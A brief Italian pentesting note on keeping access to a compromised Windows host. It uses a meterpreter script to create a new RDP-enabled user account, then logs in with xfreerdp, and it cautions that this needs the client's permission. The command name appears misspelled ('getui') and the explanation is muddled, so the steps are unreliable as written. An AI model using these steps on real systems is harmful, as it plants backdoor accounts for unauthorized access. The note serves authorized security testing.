
# Peristenza su Windows tramite RDP
Questo tipo di persistenca crea un account con rdp abilitato quindi se non si dovesse avere il permesso dal cliente di poter creare utenti sul target, non dobbiamo farlo. <br>
Dopo aveer ottenuto una sessione meterpreter, usiamo il comando: 
```bash
run getui -e -u <nuovoUtente> -p <nuovaPassword>
```
questo comando serve sia per abilitare che per verificare che RDP sia abilitato sul target in modo che se dovesse creare un utente, sarà abilitato e se non lo dovesse creare, sarà disabilitato. <br> 
per poter accedere al nuovo utente creato usando rdp usiamo il comando: 
```bash
xfreerdp /u:<utente> /p:<password> /v:<IP>
```
